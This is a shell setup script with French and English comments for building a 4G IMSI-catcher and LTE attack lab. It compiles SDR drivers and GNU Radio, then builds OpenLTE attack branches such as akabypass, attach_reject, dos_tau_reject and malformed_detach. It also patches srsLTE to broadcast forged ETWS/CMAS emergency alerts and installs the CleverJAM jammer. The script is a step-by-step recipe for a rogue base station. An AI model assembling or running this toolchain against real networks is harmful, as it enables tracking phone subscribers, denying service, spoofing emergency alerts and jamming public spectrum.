 # OS : UBUNTU 20.04
 # CHANGE THE INTERFACE CARD CORRECTLY FOR HAVING INTERNET
 # CHANGE THE USB AS 3.x


# REALISATION D’UN IMSI-CATCHER 4G HALF-MIDDLE MAN AVEC OPENLTE: 
# Les attaques avancées possibles avec un half man in the middle  
# (fake bts seulement mais sans fake ms)
#	Lecture :  version de OpenLTE
#        https://openlte.sourceforge.net
#        https://sourceforge.net/projects/openlte/files/

# /*
""""""""""
" LECTURE:
""""""""""
	Pour plus de comprehension : 
	https://github.com/ImsicatcherBastienbaranoff/OpenLTE_RedirectionPatch/blob/main/all_patch.patch

 
Remplacer par if((devs[idx-1]["type"] == "soapy")) par :

       if((devs[idx-1]["type"] == "soapy")||(devs[idx-1]["type"] == "uhd"))
       
""""""""""""""""
" Pour limeSDR :
""""""""""""""""
--- a/LTE_fdd_enodeb/src/LTE_fdd_enb_radio.cc2 2019-11-29 16:51:43.643623681 +0100

+++ b/LTE_fdd_enodeb/src/LTE_fdd_enb_radio.cc           2019-11-29 16:42:13.751607399 +0100

@@ -252,8 +252,6 @@

             usrp->set_rx_freq((double)liblte_interface_ul_earfcn_to_frequency(ul_earfcn));

             usrp->set_tx_gain(tx_gain);

             usrp->set_rx_gain(rx_gain);

+            usrp->set_tx_antenna("BAND2");

+           usrp->set_rx_antenna("LNAH");

             // Setup the TX and RX streams

             tx_stream  = usrp->get_tx_stream(stream_args);

             rx_stream  = usrp->get_rx_stream(stream_args);

# */


##########################################################################
#              FIRST STEP INSTALLING ALL COMMONS DRIVERS
##########################################################################

mkdir src
cd src
mkdir drivers
cd drivers
mkdir ../../Desktop/ltehack_backup
apt update
	
# python3-pyqt4     python-qt4    libgsi-dev     libssl1.0-dev   
# libqt4-opengl-dev    libssl1.0-dev
# libnicursesw5-dev     libpython-dev     python-pip
# python-sphinx*
# libpython-dev libncursesw5-dev


apt-get install libjeromq-java libzmq-ffi-perl libzmq-java libzmq-java-doc libzmq-jni libzmq3-dev libzmq5 libzmqpp-dev libzmqpp4 python3-zmq python3-zmq libboost-dev libpython3.8-dev cmake build-essential python3-qwt python3-guiqwt python3-pyqt5.qwt libgmp-dev libxi-dev libcppunit-dev libx11-6 libx11-dev flex libncurses5 libncurses5-dev libncursesw6 libpcsclite-dev libsdl1.2-dev zlib1g-dev libmpfr6 libmpc3 lemon aptitude libtinfo-dev libtool shtool autoconf git-core pkg-config make libmpfr-dev python-cheetah libmpc-dev libtalloc-dev libfftw3-dev libgnutls28-dev libtool-bin python-lxml libxml2-dev python-sip sofia-sip-bin libsofia-sip-ua-dev sofia-sip-bin bison libgmp3-dev alsa-oss asn1c libdbd-sqlite3 libboost-all-dev libusb-1.0-0-dev python-mako python3-mako doxygen python-docutils cmake build-essential g++ python-numpy python3-numpy swig libsqlite3-dev libi2c-dev libwxgtk3.0-gtk3-dev freeglut3-dev composer phpunit python3-pip libfontconfig1-dev libxrender-dev python-sip-dev  libusb-dev libusb-1.0.0-dev libcomedi-dev libzmq3-dev javascript-common libjs-jquery libjs-sphinxdoc libjs-underscore python-sphinx-click-doc python-sphinx-copybutton-doc python-sphinx-feature-classification-doc python-sphinx-gallery-doc python-sphinxcontrib.bibtex-doc python-sphinxcontrib.programoutput-doc python-sphinxcontrib.spelling-doc build-essential libgmp-dev libx11-6 libx11-dev flex libncurses5 libncurses5-dev libncursesw6 libpcsclite-dev zlib1g-dev libmpfr6 libmpc3 lemon aptitude libtinfo-dev libtool shtool autoconf git-core pkg-config make libmpfr-dev libmpc-dev libtalloc-dev libfftw3-dev libgnutls28-dev  libtool-bin libxml2-dev sofia-sip-bin libsofia-sip-ua-dev sofia-sip-bin bison libgmp3-dev alsa-oss asn1c libdbd-sqlite3 libboost-all-dev libusb-1.0-0-dev python-mako python3-mako doxygen python-docutils cmake build-essential g++ python-numpy python3-numpy swig libsqlite3-dev libi2c-dev libwxgtk3.0-gtk3-dev freeglut3-dev composer phpunit python3-pip


git clone https://github.com/ettusresearch/uhd
cd uhd/
git checkout aea0e2de34803d5ea8f25d7cf2fb08f4ab9d43f0
cd ..
zip -r uhd.zip uhd
mv uhd.zip ../../Desktop/ltehack_backup 
cd uhd/host/ && mkdir build && cd build/

cmake ..
make
#make test
make install
ldconfig
cd ../../..

/usr/local/lib/uhd/utils/uhd_images_downloader.py

git clone https://github.com/pothosware/SoapySDR
cd SoapySDR/
git checkout f722f9ce5b629c3c44401a9bf628b3f8e67a9695
cd ..
zip -r SoapySDR.zip SoapySDR/
mv SoapySDR.zip ../../Desktop/ltehack_backup 

cd SoapySDR && mkdir build && cd build
cmake ..
make
make install
ldconfig
cd ../..



git clone https://github.com/nuand/BladeRF
zip -r BladeRF_final.zip BladeRF/
mv BladeRF_final.zip ../../Desktop/ltehack_backup 
cd BladeRF/
git checkout 45521019c540392287eb6e03d52b8073b2fd0743
cd ..
zip -r BladeRF.zip BladeRF/
mv BladeRF.zip ../../Desktop/ltehack_backup 
cd BladeRF && mkdir build && cd build/
cmake ..
cd ../..
zip -r BladeRF_with_noOS.zip BladeRF/
mv BladeRF_with_noOS.zip ../../Desktop/ltehack_backup 
cd BladeRF && cd build
make
make install
ldconfig
cd ../..



git clone https://github.com/pothosware/SoapyBladeRF
cd SoapyBladeRF/
git checkout 1c1e8aaba5e8ee154b34c6c3b17743d1c9b9a1ea
cd ..
zip -r SoapyBladeRF.zip SoapyBladeRF/
mv SoapyBladeRF.zip ../../Desktop/ltehack_backup 
cd SoapyBladeRF && mkdir build && cd build/
cmake ..
make
make install
ldconfig
cd ../..

# If Problem_bladerf
# bladeRF-cli -v verbose -L hostedxA4.rbf
 


git clone https://github.com/myriadrf/LimeSuite
cd LimeSuite
#git checkout c931854ead81307206bce750c17c230181065545
git checkout c931854ead81307206bce750c17c
cd ..
zip -r LimeSuite.zip LimeSuite
mv LimeSuite.zip ../../Desktop/ltehack_backup 
cd LimeSuite && cd build
cmake ..
make
make install
ldconfig
cd ../..

cd ..

####################################################################
#                   INSTALLING GRC 37 + LTE ATTACK
####################################################################
# Installing HackRF Software — HackRF documentation
# How to install hackrf on Ubuntu 20.04 (Focal Fossa)? (devmanuals.net)

mkdir grc37
cd grc37

# /*
# https://kb.ettus.com/Building_and_Installing_the_USRP_Open-Source_Toolchain_(UHD_and_GNU_Radio)_on_Linux
# */
#apt-get install python-zmq


sudo apt-get -y install autoconf automake build-essential ccache cmake cpufrequtils doxygen ethtool fort77 g++ gir1.2-gtk-3.0 git gobject-introspection gpsd gpsd-clients inetutils-tools libasound2-dev libboost-all-dev libcomedi-dev libcppunit-dev libfftw3-bin libfftw3-dev libfftw3-doc libfontconfig1-dev libgmp-dev libgps-dev libgsl-dev liblog4cpp5-dev libncurses5 libncurses5-dev libpulse-dev libqt5opengl5-dev libqwt-qt5-dev libsdl1.2-dev libtool libudev-dev libusb-1.0-0 libusb-1.0-0-dev libusb-dev libxi-dev libxrender-dev libzmq3-dev libzmq5 ncurses-bin python3-cheetah python3-click python3-click-plugins python3-click-threading python3-dev python3-docutils python3-gi python3-gi-cairo python3-gps python3-lxml python3-mako python3-numpy python3-numpy-dbg python3-opengl python3-pyqt5 python3-requests python3-scipy python3-setuptools python3-six python3-sphinx python3-yaml python3-zmq python3-ruamel.yaml swig wget


git clone https://github.com/mossmann/hackrf.git
cd hackrf
# date 2018 : 5e9cad66363467fae93aec29679c041c03905047
git checkout 189b5bf693620d43d27fe8accdf112c85ce833a0

cd ..
zip -r hackrf_grc37.zip hackrf
mv hackrf_grc37.zip ../../Desktop/ltehack_backup 
cd hackrf/host && mkdir build && cd build
cmake ..
make
make install
ldconfig
cd ../../..
 

git clone https://github.com/pothosware/SoapyHackRF.git
cd SoapyHackRF/
git checkout 6c0c33f0aa44c3080674e6bca0273184d3e9eb44
cd ..
zip -r SoapyHackRF_grc37.zip SoapyHackRF
mv SoapyHackRF_grc37.zip ../../Desktop/ltehack_backup 
cd SoapyHackRF && mkdir build && cd build
cmake ..
make
make install
ldconfig
cd ../..


# FLASHING HACKRF WITH NEW FIRMWARE
wget https://github.com/greatscottgadgets/hackrf/releases/download/v2023.01.1/hackrf-2023.01.1.tar.xz

tar -xvf hackrf-2023.01.1.tar.xz
mv hackrf-2023.01.1.tar.xz ../../Desktop/ltehack_backup 
cd hackrf-2023.01.1/firmware-bin/

# PRESS DFU AND RESET
hackrf_spiflash -w hackrf_one_usb.bin

#PRESS RESET

#apt-get install dfu-util
#dfu-util -D hackrf_one_usb.dfu 



# Test : plug hackrf
hackrf_info
SoapySDRUtil --info

#Available factories...hackrf, null,

SoapySDRUtil --probe="driver=hackrf"
SoapySDRUtil --make="driver=hackrf"


cd ../..
git clone https://github.com/pothosware/SoapyUHD
cd SoapyUHD/
git checkout 47972ba8b96beffb79915e300acea168bacd8d84
cd ..
zip -r SoapyUHD_grc37.zip SoapyUHD
mv SoapyUHD_grc37.zip ../../Desktop/ltehack_backup 
cd SoapyUHD && mkdir build && cd build
cmake ..
make
make install
ldconfig
cd ../..

Test :
uhd_usrp_probe

# UNPLUG HACKRF

git clone https://github.com/gnuradio/gnuradio
zip -r gnuradio_final.zip gnuradio
mv gnuradio_final.zip ../../Desktop/ltehack_backup 

cd gnuradio/
git checkout 2d7f82342c1d63a1c4d7e18eb1289636ebcbb855
git submodule init && git submodule update
cd ..
zip -r gnuradio_grc37.zip gnuradio
mv gnuradio_grc37.zip ../../Desktop/ltehack_backup 
cd gnuradio && mkdir build && cd build
cmake ..
make
#make test
make install
ldconfig
cd ../..

 

 

git clone https://github.com/osmocom/gr-osmosdr
cd gr-osmosdr/
git checkout 4d83c60
cd ..
zip -r gr-osmosdr_grc37.zip gr-osmosdr
mv gr-osmosdr_grc37.zip ../../Desktop/ltehack_backup 
cd gr-osmosdr && mkdir build && cd build
cmake ..
make
make install
ldconfig
cd ../..

  
cd ..

# git clone https://github.com/timkim0713/RFJamming-FMRadio-SDR
# zip -r RFJamming-FMRadio-SDR.zip RFJamming-FMRadio-SDR/

#################################################################
#                    INSTALLING ATTACKLTE 
##################################################################

mkdir attacklte
cd attacklte

# (commande en une seule ligne)

mkdir polarssl && cd polarssl && wget https://src.fedoraproject.org/repo/pkgs/polarssl/polarssl-1.3.7-gpl.tgz/b656e4c83ee94f93d19eb0832fd7f976/polarssl-1.3.7-gpl.tgz


# or

git clone https://github.com/ImsicatcherBastienbaranoff/polarssl && cd polarssl

tar xvzf polarssl-1.3.7-gpl.tgz  
mv polarssl-1.3.7-gpl.tgz ../../../Desktop/ltehack_backup 
cd polarssl-1.3.7 
mkdir build && cd build
cmake ..
make
make install
ldconfig
cd ../../..
 

# /*
# Compilez openlte avec redirection :
# Pour plus de comprehension : https://github.com/ImsicatcherBastienbaranoff/OpenLTE_RedirectionPatch/blob/main/all_patch.patch

Remplacer par if((devs[idx-1]["type"] == "soapy")) par :

       if((devs[idx-1]["type"] == "soapy")||(devs[idx-1]["type"] == "uhd"))

""""""""""""""""
" Pour limeSDR :
""""""""""""""""
--- a/LTE_fdd_enodeb/src/LTE_fdd_enb_radio.cc2 2019-11-29 16:51:43.643623681 +0100

+++ b/LTE_fdd_enodeb/src/LTE_fdd_enb_radio.cc           2019-11-29 16:42:13.751607399 +0100

@@ -252,8 +252,6 @@

             usrp->set_rx_freq((double)liblte_interface_ul_earfcn_to_frequency(ul_earfcn));

             usrp->set_tx_gain(tx_gain);

             usrp->set_rx_gain(rx_gain);

+            usrp->set_tx_antenna("BAND2");

+           usrp->set_rx_antenna("LNAH");

             // Setup the TX and RX streams

             tx_stream  = usrp->get_tx_stream(stream_args);

             rx_stream  = usrp->get_rx_stream(stream_args);
# */
 
apt-get  install net-tools
git clone https://github.com/bbaranoff/openlte
cd openlte/
git checkout 4bd673b
cd ..
mv openlte openlte_redir
zip -r openlte_redir.zip openlte_redir
mv openlte_redir.zip  ../../Desktop/ltehack_backup/
cd openlte_redir
mkdir build && cd build/
cmake ..
make
make install
ldconfig
LTE_fdd_enodeb
cd ../..

 
# /*
Compilez la dernière version de OpenLTE à savoir qu’il y a d’autres attaques en utilisant git checkout nom_attaque

Some attacks implemented by @onkarmumbrekar can be found in the different branches:

·         https://github.com/ImsicatcherBastienbaranoff/Advanced_LTE_ATTACK

·         https://drive.google.com/drive/folders/1u5bRMle3_iirDNfIEe8toGC4WDKfvkA5?usp=share_link
·         https://github.com/mgp25/OpenLTE

""""""""""""""""""
" LTE ATTACK TYE : 
""""""""""""""""""
    akabypass
    attach_reject
    dos_tau_reject_dualcause
    dos_tau_reject
    malformed_detach
    numb_attack
    service_reject_on_tau
    tau_numb_attack

Pour plus d’info veuillez lire l’article : https://github.com/mgp25/OpenLTE

# */

git clone https://github.com/mgp25/OpenLTE
mv OpenLTE OpenLTE_mgp25
zip -r OpenLTE_mgp25.zip OpenLTE_mgp25
mv OpenLTE_mgp25.zip ../../Desktop/ltehack_backup/

cd OpenLTE_mgp25/
mkdir build
cd build && cmake ..
make
make install
ldconfig
cd ../..


# /*
Testons les autres cas, si jamais le checkout n’existe plus, il se trouve dans le drive du lien en haut

Fixing problem bladerf : https://github.com/ImsicatcherBastienbaranoff/OpenLTE_Patch_AdvancedAttack

# */
 

gedit LTE_fdd_enodeb/src/LTE_fdd_enb_radio.cc

# Regarder la fonction : bladerf_get_timestamp 
# Puis remplacer BLADERF_MODULE_RX par BLADERF_RX

# Remplacer tous : BLADERF_TX par BLADERF_TX_X1
# Puis Remplacer tous : BLADERF_MODULE_RX  par  BLADERF_RX_X1

#############
# akabypass :
############# 

git clone https://github.com/mgp25/OpenLTE
zip -r OpenLTE.zip OpenLTE
cd OpenLTE
git checkout akabypass
gedit LTE_fdd_enodeb/src/LTE_fdd_enb_radio.cc

# Regarder la fonction : bladerf_get_timestamp 
# Puis remplacer BLADERF_MODULE_RX par BLADERF_RX

# Remplacer tous : BLADERF_TX par BLADERF_TX_X1
# Puis Remplacer tous : BLADERF_MODULE_RX  par  BLADERF_RX_X1

   
rm -rf build/
cd ..
mv OpenLTE OpenLTE_akabypass
zip -r OpenLTE_akabypass.zip OpenLTE_akabypass/
mv OpenLTE_akabypass.zip ../../Desktop/ltehack_backup/
cd OpenLTE_akabypass && mkdir build && cd build
cmake ..
make
make install
ldconfig
cd ../..

 
#################
# attach_reject : 
#################

unzip OpenLTE.zip 
cd OpenLTE
git checkout attach_reject
gedit LTE_fdd_enodeb/src/LTE_fdd_enb_radio.cc

# Regarder la fonction : bladerf_get_timestamp 
# Puis remplacer BLADERF_MODULE_RX par BLADERF_RX

# Remplacer tous : BLADERF_TX par BLADERF_TX_X1
# Puis Remplacer tous : BLADERF_MODULE_RX  par  BLADERF_RX_X1
   
rm -rf build/
cd ..
mv OpenLTE OpenLTE_attach_reject
zip -r OpenLTE_attach_reject.zip OpenLTE_attach_reject
mv OpenLTE_attach_reject.zip ../../Desktop/ltehack_backup/
cd OpenLTE_attach_reject && mkdir build && cd build
cmake ..
make
make install
ldconfig
cd ../..



#############################
#  dos_tau_reject_dualcause : 
#############################

unzip OpenLTE.zip 
cd OpenLTE
git checkout dos_tau_reject_dualcause
gedit LTE_fdd_enodeb/src/LTE_fdd_enb_radio.cc

# Regarder la fonction : bladerf_get_timestamp 
# Puis remplacer BLADERF_MODULE_RX par BLADERF_RX

# Remplacer tous : BLADERF_TX par BLADERF_TX_X1
# Puis Remplacer tous : BLADERF_MODULE_RX  par  BLADERF_RX_X1
   
rm -rf build/
cd ..
mv OpenLTE OpenLTE_dos_tau_reject_dualcause
zip -r OpenLTE_dos_tau_reject_dualcause.zip OpenLTE_dos_tau_reject_dualcause

mv OpenLTE_dos_tau_reject_dualcause.zip ../../Desktop/ltehack_backup/

cd OpenLTE_dos_tau_reject_dualcause && mkdir build && cd build
cmake ..
make
make install
ldconfig
cd ../..


 

##################
# dos_tau_reject : 
##################

unzip OpenLTE.zip 
cd OpenLTE
git checkout dos_tau_reject
gedit LTE_fdd_enodeb/src/LTE_fdd_enb_radio.cc

# Regarder la fonction : bladerf_get_timestamp 
# Puis remplacer BLADERF_MODULE_RX par BLADERF_RX

# Remplacer tous : BLADERF_TX par BLADERF_TX_X1
# Puis Remplacer tous : BLADERF_MODULE_RX  par  BLADERF_RX_X1
   
rm -rf build/
cd ..
mv OpenLTE OpenLTE_dos_tau_reject
zip -r OpenLTE_dos_tau_reject.zip OpenLTE_dos_tau_reject

mv OpenLTE_dos_tau_reject.zip  ../../Desktop/ltehack_backup/

cd OpenLTE_dos_tau_reject && mkdir build && cd build
cmake ..
make
make install
ldconfig
cd ../..
 


####################
# malformed_detach :
####################
  
unzip OpenLTE.zip 
cd OpenLTE
git checkout malformed_detach 
gedit LTE_fdd_enodeb/src/LTE_fdd_enb_radio.cc

# Regarder la fonction : bladerf_get_timestamp 
# Puis remplacer BLADERF_MODULE_RX par BLADERF_RX

# Remplacer tous : BLADERF_TX par BLADERF_TX_X1
# Puis Remplacer tous : BLADERF_MODULE_RX  par  BLADERF_RX_X1
   
rm -rf build/
cd ..
mv OpenLTE OpenLTE_malformed_detach 
zip -r OpenLTE_malformed_detach.zip OpenLTE_malformed_detach 
mv OpenLTE_malformed_detach.zip  ../../Desktop/ltehack_backup/
cd OpenLTE_malformed_detach && mkdir build && cd build
cmake ..
make
make install
ldconfig
cd ../..




###############
# numb_attack :
###############
 
unzip OpenLTE.zip 
cd OpenLTE
git checkout numb_attack
gedit LTE_fdd_enodeb/src/LTE_fdd_enb_radio.cc

# Regarder la fonction : bladerf_get_timestamp 
# Puis remplacer BLADERF_MODULE_RX par BLADERF_RX

# Remplacer tous : BLADERF_TX par BLADERF_TX_X1
# Puis Remplacer tous : BLADERF_MODULE_RX  par  BLADERF_RX_X1
   
rm -rf build/
cd ..
mv OpenLTE OpenLTE_numb_attack 
zip -r OpenLTE_numb_attack.zip OpenLTE_numb_attack 
mv OpenLTE_numb_attack.zip ../../Desktop/ltehack_backup/
cd OpenLTE_numb_attack && mkdir build && cd build
cmake ..
make
make install
ldconfig
cd ../..

#########################
# service_reject_on_tau :
#########################
  
unzip OpenLTE.zip 
cd OpenLTE
git checkout service_reject_on_tau
gedit LTE_fdd_enodeb/src/LTE_fdd_enb_radio.cc

# Regarder la fonction : bladerf_get_timestamp 
# Puis remplacer BLADERF_MODULE_RX par BLADERF_RX

# Remplacer tous : BLADERF_TX par BLADERF_TX_X1
# Puis Remplacer tous : BLADERF_MODULE_RX  par  BLADERF_RX_X1
   
rm -rf build/
cd ..
mv OpenLTE OpenLTE_service_reject_on_tau
zip -r OpenLTE_service_reject_on_tau.zip OpenLTE_service_reject_on_tau
mv OpenLTE_service_reject_on_tau.zip ../../Desktop/ltehack_backup/

cd OpenLTE_service_reject_on_tau && mkdir build && cd build
cmake ..
make
make install
ldconfig
cd ../..


 
###################
# tau_numb_attack :
###################  

unzip OpenLTE.zip 
cd OpenLTE
git checkout tau_numb_attack
gedit LTE_fdd_enodeb/src/LTE_fdd_enb_radio.cc

# Regarder la fonction : bladerf_get_timestamp 
# Puis remplacer BLADERF_MODULE_RX par BLADERF_RX

# Remplacer tous : BLADERF_TX par BLADERF_TX_X1
# Puis Remplacer tous : BLADERF_MODULE_RX  par  BLADERF_RX_X1
   
rm -rf build/
cd ..
mv OpenLTE OpenLTE_tau_numb_attack
zip -r OpenLTE_tau_numb_attack.zip OpenLTE_tau_numb_attack
mv OpenLTE_tau_numb_attack.zip ../../Desktop/ltehack_backup/

cd OpenLTE_tau_numb_attack && mkdir build && cd build
cmake ..
make
make install
ldconfig
cd ../..
 

# /*
FUTUR CAS : AJOUTER PWS DANS OPEN_LTE

liblte_rrc.h

typedef struct{


    LIBLTE_RRC_PAGING_RECORD_STRUCT          paging_record_list[LIBLTE_RRC_MAX_PAGE_REC];


    LIBLTE_RRC_PAGING_V890_IES_STRUCT        non_crit_ext;


    LIBLTE_RRC_SYSTEM_INFO_MODIFICATION_ENUM system_info_modification;


    LIBLTE_RRC_ETWS_INDICATION_ENUM          etws_indication;


    uint32                                   paging_record_list_size;


    bool                                     system_info_modification_present;


    bool                                     etws_indication_present;


    bool                                     non_crit_ext_present;


}LIBLTE_RRC_PAGING_STRUCT;

 

Insertion de fonction SIB10,11,12

LIBLTE_ERROR_ENUM liblte_rrc_pack_sys_info_msg(LIBLTE_RRC_SYS_INFO_MSG_STRUCT *sibs,

                                               LIBLTE_BIT_MSG_STRUCT          *msg)

….

     case LIBLTE_RRC_SYS_INFO_BLOCK_TYPE_7:

                case LIBLTE_RRC_SYS_INFO_BLOCK_TYPE_9:

                case LIBLTE_RRC_SYS_INFO_BLOCK_TYPE_10:

                case LIBLTE_RRC_SYS_INFO_BLOCK_TYPE_11:

   

gedit liblte/src/liblte_rrc.cc

Recherchons : IE Name: System Information Block Type 10

(s’il n’arrive pas  à faire de recherche enlever les espaces avant et derrières le texte à chercher)

Ajoutons le code proprement dit

 

 

Recherchons : IE Name: System Information Block Type 11

(s’il n’arrive pas  à faire de recherche enlever les espaces avant et derrières le texte à chercher)

Ajoutons le code proprement dit 

Recherchons : IE Name: System Information Block Type 12  

(s’il n’arrive pas  à faire de recherche enlever les espaces avant et derrières le texte à chercher)

Ajoutons le code proprement dit : A faire (non fini)

# */

####################
# SRS_LTE WITH CMAS: 
####################

sudo apt-get install cmake libfftw3-dev libmbedtls-dev libboost-program-options-dev libconfig++-dev libsctp-dev 

git clone https://github.com/Risteel/srsLTE_cmas_etws
zip -r srsLTE_cmas_etws.zip srsLTE_cmas_etws
mv srsLTE_cmas_etws.zip ../../Desktop/ltehack_backup/
cd srsLTE_cmas_etws && mkdir build && cd build
cmake ..
make
make install
ldconfig
cd ../..


mv OpenLTE.zip ../../Desktop/ltehack_backup/
cd .. 


# /*  JUST COMMENT FOR OTHER CMAS ATTACK
# Modification to srsLTE to enable wireless emergency alerts (WEA) via SIB-12 CMAS messages. CMU 14-829 Mobile & IoT Security project. 
ASN FILE : etws_indication_present or cmas_indication_present 

Thank's for reply me, i see it :
it's etws_ind_present  on paging_s and his asn1 code is :
// Paging ::= SEQUENCE
struct paging_s { 
// member variables 
bool                 paging_record_list_present = false; 
bool                 sys_info_mod_present       = false; 
bool                 etws_ind_present           = false; 
bool                 non_crit_ext_present       = false; 
paging_record_list_l paging_record_list;  paging_v890_ies_s    non_crit_ext;
// sequence methods 
SRSASN_CODE pack(bit_ref& bref) const; 
SRSASN_CODE unpack(bit_ref& bref);  void        to_json(json_writer& j) const;};

and for cmas_ind_r9_present on the asn 1 is :  
// Paging-v920-IEs ::= SEQUENCE
struct paging_v920_ies_s { 
// member variables 
bool               cmas_ind_r9_present  = false; 
bool               non_crit_ext_present = false; 
paging_v1130_ies_s non_crit_ext;
// sequence methods 
SRSASN_CODE pack(bit_ref& bref) const; 
SRSASN_CODE unpack(bit_ref& bref); 
void        to_json(json_writer& j) const;};



NOT RUN ----- SELECT ADEQUAT CHECKOUT

Mode normal : git checkout c115b14 (c115b14cd745d75aa68e8ed147ac2f05a2675f0a)
Mode chinese : git checkout 259f211 (259f21133b27d6b9fe8eca03a6a679c48f778ff5)

git clone https://github.com/aluminiumi/srsLTE-plus-sib12
zip -r srsLTE-plus-sib12.zip srsLTE-plus-sib12/
cd srsLTE-plus-sib12
git checkout c115b14cd745d75aa68e8ed147ac2f05a2675f0a
 gedit srsenb/src/stack/rrc/rrc.cc 

Ajouter en bas de : pcch_msg.msg.c1().paging()
  paging_s* paging_rec = &pcch_msg.msg.c1().paging(); /*modify paging message*/
  /*adding indication of SIB11 and SIB10, only for ETWS*/
    paging_rec->etws_ind_present = true;
   /*adding indication of SIB12, like our, CMAS indication*/
    paging_rec->non_crit_ext_present = true;
    
    paging_v890_ies_s paging_v890;
    paging_v890.non_crit_ext_present = true;
    paging_v920_ies_s paging_v920;    
     paging_v920.cmas_ind_r9_present = true;

    paging_v890.non_crit_ext = paging_v920;
    paging_rec->non_crit_ext =  paging_v890;  



 zip -r srsLTE-plus-sib12_Normal.zip srsLTE-plus-sib12
 cd srsLTE-plus-sib12 && mkdir build && cd build
 cmake ..

# */



####################################################################
#                   INSTALLING GRC 38 + CLEVER JAM
####################################################################

sudo apt-get install git cmake g++ libboost-all-dev libgmp-dev swig python3-numpy  python3-mako python3-sphinx python3-lxml doxygen libfftw3-dev  libsdl1.2-dev libgsl-dev libqwt-qt5-dev libqt5opengl5-dev python3-pyqt5  liblog4cpp5-dev libzmq3-dev python3-yaml python3-click python3-click-plugins python3-zmq python3-scipy python3-gi python3-gi-cairo gir1.2-gtk-3.0 libcodec2-dev libgsm1-dev libusb-1.0-0 libusb-1.0-0-dev libudev-dev

# /*
# git log --since="2022-1-1" --until="2022-1-30"
# git log --since="2021-1-1" --until="2021-1-10"
#  BEST PRECAUTION : 
 https://wiki.gnuradio.org/index.php?title=ModuleNotFoundError#B._Finding_the_Python_library
 https://wiki.gnuradio.org/index.php/UbuntuInstall
# THE VARIABLE HAS RED CROSS IN GRC, IT IS NOT ERROR ON UBUNTU
# INSTALLING DEPENDENCIES + GNURADIO USING maint version + LOOK THE DATE
# FINDING GR-OSMOSDR COMPATIBLE WITH GNURADIO + NEAR (<) THE DATE
# ALL DEVICES (HACKRF) SHOULD BE NEAR (<) THE DATE OF GR-OSMOSDR 
# COMPILING BY ORDER : 
# DRIVER DEVICES -> SOAPYHACKRF ->  SOAPY_UHD -> GR-OSMOSDR


# hackrf 10/12/2020 < 11/01/2021 :  
# 61a06b904dbf5e54da1d84473004db0472950487
# soapyhackrf 21/08/2020 < 11/01/2021 : 
# soapyhackrf : 7d530872f96c1cbe0ed62617c32c48ce7e103e1d 
# gr-osmosdr 11/01/2021 : cffef690f29e0793cd2d6c5d028c0c929115f0ac


# INSTALLING GNURADIO maint-3.8 DATE :  
# 1Fevrier 2022 : maint-3.8 or 57bd109d5f0afdf09a3a52e226f464e8a71c5b82

# */
 
 
mkdir grc38
cd grc38
git clone https://github.com/mossmann/hackrf.git
mv hackrf hackrf_grc38
cd hackrf_grc38
git checkout 61a06b904dbf5e54da1d84473004db0472950487
cd ..
zip -r hackrf_grc38.zip hackrf_grc38
mv hackrf_grc38.zip ../../Desktop/ltehack_backup/
cd hackrf_grc38/host && mkdir build && cd build
cmake ..
make
make install
ldconfig
cd ../../..


git clone https://github.com/pothosware/SoapyHackRF.git
cd SoapyHackRF/
git checkout 7d530872f96c1cbe0ed62617c32c48ce7e103e1d
cd ..
mv SoapyHackRF SoapyHackRF_grc38
zip -r SoapyHackRF_grc38.zip SoapyHackRF_grc38
mv SoapyHackRF_grc38.zip ../../Desktop/ltehack_backup/
cd SoapyHackRF_grc38 && mkdir build && cd build
cmake ..
make
make install
ldconfig
cd ../..

# PLUG HACKRF
# Test : 
hackrf_info
SoapySDRUtil --info
# Available factories...hackrf, null,

SoapySDRUtil --probe="driver=hackrf"
SoapySDRUtil --make="driver=hackrf"



git clone https://github.com/pothosware/SoapyUHD
cd SoapyUHD/
git checkout 47972ba8b96beffb79915e300acea168bacd8d84
cd ..
mv SoapyUHD SoapyUHD_grc38
zip -r SoapyUHD_grc38.zip SoapyUHD_grc38
mv SoapyUHD_grc38.zip ../../Desktop/ltehack_backup/
cd SoapyUHD_grc38 && mkdir build && cd build
cmake ..
make
make install
ldconfig
cd ../..

# Test :
 uhd_usrp_probe

# https://wiki.gnuradio.org/index.php/UbuntuInstall
# https://wiki.gnuradio.org/index.php?title=LinuxInstall#From_Source

# https://github.com/gnuradio/volk/issues/340
apt-get update && apt-get clean && apt-get autoremove && apt-get install -y apt-utils

apt-get install -y \
        build-essential \
        cmake \
        git \
        pkg-config \
        python3-mako \
        python3-numpy \
        python3-distutils \
        gcc-9 g++-9 gdb

git clone https://github.com/gnuradio/gnuradio
mv gnuradio gnuradio_38
cd gnuradio_38
git checkout maint-3.8  
# git pull --recurse-submodules=on
# git submodule update --init
git submodule init && git submodule update
cd ..
zip -r  gnuradio_38.zip  gnuradio_38
mv gnuradio_38.zip ../../Desktop/ltehack_backup/
cd gnuradio_38 && mkdir build && cd build


cmake -DCMAKE_BUILD_TYPE=Release -DPYTHON_EXECUTABLE=/usr/bin/python3.8 ../


make 
make test
make install
ldconfig
 
 
export PYTHONPATH=/usr/local/lib/python3/dist-packages:/usr/local/lib/python3.8/dist-packages:$PYTHONPATH


export LD_LIBRARY_PATH=/usr/local/lib:$LD_LIBRARY_PATH

cd ../..


# TEST GNURADIO COMPAGNION
gnuradio-companion


git clone https://github.com/osmocom/gr-osmosdr
cd gr-osmosdr/
git checkout cffef690f29e0793cd2d6c5d028c0c929115f0ac
cd ..
mv gr-osmosdr gr-osmosdr_grc38
zip -r gr-osmosdr_grc38.zip gr-osmosdr_grc38
mv gr-osmosdr_grc38.zip ../../Desktop/ltehack_backup/
cd gr-osmosdr_grc38 && mkdir build && cd build
cmake ..
make
make install
ldconfig
cd ../..

cd ..

# RUNNING CLEVERJAM : 
git clone https://github.com/jhonnybonny/CleverJAM

zip -r CleverJAM.zip CleverJAM/
mv CleverJAM.zip ../Desktop/ltehack_backup/
cd CleverJAM/sources

# RUN GNURADIO COMPANION + FILE AND OPEN jam.grc + SET CORRECT FREQUENCY
gnuradio-companion

# USE "LTE DISCOVERY" OR "NETWORK SIGNAL GURU" 
# OR USE CODE USSD : *#*#4636#*#* on ANDROID
# OR USE CODE USSD : *#0011# on SAMSUNG
# OR USE CODE USSD : *300#12345#* on I-PHONE


# Clever jam could run with hopping frequency using python scrip
# regards read me cleverjam for test








####################################################################
#                  INSTALLING OPENBTS/ OPENBTS UMTS
####################################################################
# https://github.com/PentHertz/OpenBTS/
# https://github.com/PentHertz/OpenBTS/blob/master/preinstall.sh


# Installing compilation dependencies
